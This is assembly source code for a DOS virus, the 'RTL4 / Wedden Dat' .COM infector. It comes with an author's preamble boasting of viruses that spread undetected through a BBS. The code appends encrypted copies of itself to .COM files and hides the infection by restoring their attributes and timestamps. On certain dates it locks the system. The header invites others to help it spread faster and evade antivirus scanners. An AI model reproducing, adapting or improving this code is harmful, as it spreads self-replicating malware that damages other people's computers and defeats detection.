;******************************************************************************
;
; RTL4 / WEDDEN DAT... VIRUS
;
;******************************************************************************
;
; "If a weaking linkage found, eliminate...
;       Hear the cities fearfull roar!"
;
; Now in front of you lies another source of a virus. It is not a very good
; one, but, as you might say, a virus is a virus. After my wake at the PC, I
; created several viruses, like:
;
; Deicide / Glenn
; Morgoth
; Breeze
; Brother
; Commentator I
; Commentator II
; Spawnie
; Xmas
; 1St_Star / 222
; T-1000
;
; Well, I bet you think this is a whole lot, but some are minor variants, for
; which I don't have the guts to publish the source code. I have to admid,
; Deicide and Morgoth have spread very well. I uploaded them to a BBS and it
; was downloaded several times, and it is not detected by antivirus program yet.
; Deicide is now detectable, but that was my first attempt to make a virus.
;
; This virus is a Non-Resident Direct Action .COM Infector.
; It only infects files in the current directory.
; You can recognize a infected file simply, the 4th byte is a '*' (just like
; the 1St_Star virus). It is inactive from January till May and starts
; replicating from May. After July, every Wednessday after the 21st the
; program will hang the system, showing the address of RTL4 Joop v/d Ende
; Productions.
;
; Disclaimer : This program is like all other virus sources only for
; educational purposes and should not be given to irresponsible hands
; (John McAfee and people like him).
;
; For the criminal reader : Don't just change the text of this virus and
; say you made a virus. Instead use some ideas from this virus and create your
; own virus if you want to be nasty. Additions to this virus that makes it
; spreading faster and makes it harder to detect are welcome, as long as I get
; the new source code.
;
; I want to thank several virus writers for their support with letting McAfee
; and Ass. earn his money with making so many updates of SCAN...
; Here they are : Bit Addict, XSTC, Dark Helmet, Dark Avenger, Nuke!, Cracker
; Jack and many more creators.
;
; Note to XSTC : Thank you for disassembling the Deicide virus, for I have lost
; the source code. Next time write a message, because I might have the source
; code of the virus ready, but not uploaded. It saves you time, so you may
; disassemble another virus (ofcourse only for educational purposes ;-) )
;
; Now have fun with this virus, written in A86 assembler version 3.22
;
;               Glenn Benton
;
; "Is it truly a disembodied head lurking in the dark of the tombs of fate?"
;
                Org 0h                          ; The outcome will be .BIN

Start:          Jmp MainVir                     ; Jump to main virus
                Db '*'                          ; signature

MainVir:        Call On1                        ; Get virus offset
On1:            Pop BP                          ; BP is the index register
                Sub BP,Offset MainVir+3         ; Calculate virus offset
                Push Ax                         ; And store AX (error reg.)

                Lea Si,Crypt[BP]                ; Decryptor for the
                Mov Di,Si                       ; virus code. It's long
                Mov Cx,CryptLen                 ; for a decoder, but it
Decrypt:        Lodsb                           ; reduces the recognizable
                Xor Al,0                        ; part enough.
                Stosb                           ;
                Loop Decrypt                    ;

DecrLen         Equ $-MainVir                   ; Decryptor length

Crypt:          Mov Ax,Cs:OrgPrg[BP]            ; Store the 4 first bytes
                Mov Bx,Cs:OrgPrg[BP]+2          ; of the host
                Mov Cs:Start+100h,Ax            ;
                Mov Cs:Start[2]+100h,Bx         ;

                Mov Ah,2ah                      ; Get date
                Int 21h                         ; If it is a wednessday
                Cmp Dh,8                        ; after July and after
                Jb  NoMsg                       ; the 21st, it will
                Cmp Dl,22                       ; will continue, else
                Jb  NoMsg                       ; it goes to NoMsg
                Cmp Al,3                        ;
                Jne NoMsg                       ;

                Mov Ah,9                        ; Display the message
                Lea Dx,Msg[BP]                  ;
                Int 21h                         ;

Lockout:        Cli                             ; And lock the computer
                Jmp Lockout                     ;

NoMsg:          Cmp Dh,5                        ; Is it after April?
                Jae DoVirus                     ; Yes - Replicate
                Jmp Ready                       ; No - Terminate to host

DoVirus:        Mov Ah,1ah                      ; Move DTA to a safe place
                Mov Dx,0fc00h                   ; $FE00
		Int 21h

                Mov Ah,4eh                      ;
Search:         Lea Dx,FileSpec[BP]             ; Search for a .COM file in
                Xor Cx,Cx                       ; the current directory
                Int 21h                         ;

                Jnc Found                       ; If not exist, goto Ready
                Jmp Ready                       ; else goto Found

Found:          Mov Ax,4300h                    ; Get file attributes
                Mov Dx,0fc1eh                   ; and store them on the stack
                Int 21h                         ;
                Push Cx                         ;

                Mov Ax,4301h                    ; Wipe the attributes, so it
                Xor Cx,Cx                       ; is accessable for us
                Int 21h                         ;

                Mov Ax,3d02h                    ; Open the file with
                Int 21h                         ; read/write priority

                Mov Bx,5700h                    ; Get de file date/time stamp
                Xchg Ax,Bx                      ; and store them on the stack
                Int 21h                         ;
                Push Cx                         ;
                Push Dx                         ;

                Mov Ah,3fh                      ; Read the first 4 bytes
                Lea Dx,OrgPrg[BP]               ; of the program
                Mov Cx,4                        ;
                Int 21h                         ;

                Mov Ax,Cs:[OrgPrg][BP]          ; Is it a weird EXE?
                Cmp Ax,'MZ'                     ; Yes goto ExeFile
                Je ExeFile                      ;

                Cmp Ax,'ZM'                     ; Is it a normal EXE?
                Je ExeFile                      ; Yes, goto ExeFile

                Mov Ah,Cs:[OrgPrg+3][BP]        ; Is it already infected?
                Cmp Ah,'*'                      ; No, goto Infect
                Jne Infect                      ;

ExeFile:        Call Close                      ; Call File close

                Mov Ah,4fh                      ; Jump to the search routine
                Jmp Search                      ; again for a .COM file

FSeek:          Xor Cx,Cx                       ; Subroutine for jumping to
                Xor Dx,Dx                       ; the begin/end of file
                Int 21h                         ;
                Ret                             ;

Infect:         Mov Ax,4202h                    ; Jump to EOF
                Call FSeek                      ;

                Sub Ax,3                        ; Calculate new virus offset
                Mov Cs:CallPtr[BP]+1,Ax         ;

                Mov Ah,2ch                      ; Get system time
                Int 21h                         ;

                Mov Cs:Decrypt+2[BP],Dl         ; Move the decryptor part
                Lea Si,MainVir[BP]              ; with the 100ds second put
                Mov Di,0fd00h                   ; into the XOR command to
                Mov Cx,DecrLen                  ; the end of the 64K segment
                Rep Movsb                       ;

                Lea Si,Crypt[BP]                ; Encrypt the virus with
                Mov Cx,CryptLen                 ; the 100ds seconds.
Encrypt:        Lodsb                           ; Merge it behind the
                Xor Al,Dl                       ; decryptor
                Stosb                           ;
                Loop Encrypt                    ;

                Mov Ah,40h                      ; Write the virus
                Lea Dx,0fd00h                   ; at the end of the
                Mov Cx,VirLen                   ; file
                Int 21h                         ;

                Mov Ax,4200h                    ; Move to start of
                Call FSeek                      ; the file

                Mov Ah,40h                      ; Write the jump to the virus
                Lea Dx,CallPtr[BP]              ; at the begin of the file
                Mov Cx,4                        ;
                Int 21h                         ;

                Call Close                      ; Close the file

Ready:          Mov Ah,1ah                      ; Restore the DTA to the
                Mov Dx,80h                      ; original offset
                Int 21h                         ;

                Pop Ax                          ; Get (possible) error code

                Mov Bx,100h                     ; Strange jump (but nice) to
                Push Cs                         ; the begin of the program
                Push Bx                         ; (which has been restored)
                Retf                            ;

Close:          Pop Si                          ; A pop which is stupid

                Pop Dx                          ; Restore files date/time
                Pop Cx                          ; stamp
                Mov Ax,5701h                    ;
                Int 21h                         ;

                Mov Ah,3eh                      ; Close file
                Int 21h                         ;

                Mov Ax,4301h                    ; Restore attributes
                Pop Cx                          ;
                Mov Dx,0fc1eh                   ;
                Int 21h                         ;

                Push Si                         ; A push which is stupid

                Ret                             ; Return to caller

CallPtr         Db 0e9h,0,0                     ; Jump

FileSpec        Db '*.COM',0                    ; Filesearch spec & signature

; Activation message

Msg             Db 13,10,9,9,'RTL4'
                Db 13,10,'Joop van den Ende Produkties BV'
                Db 13,10,'Marco Daas (Casting Assistent)'
                Db 13,10,'Postbus 397'
                Db 13,10,'1430 AJ  AALSMEER'
                Db 13,10,'van Cleeffkade 15'
                Db 13,10,'1413 BA  AALSMEER'
                Db 13,10,'The Netherlands'
                Db 13,10,10,'Wedden dat... je een virus hebt?'
                Db 13,10,'$'

; First 4 bytes of the host program

OrgPrg:         Int 20h
                DB 'GB'                         ; My initials (Glenn Benton)

CryptLen        Equ $-Crypt                     ; Length of encrypted part

VirLen          Equ $-MainVir                   ; Length of virus
;
; Sleep well, sleep in hell...
;

;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;  컴컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴
;  컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴
;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
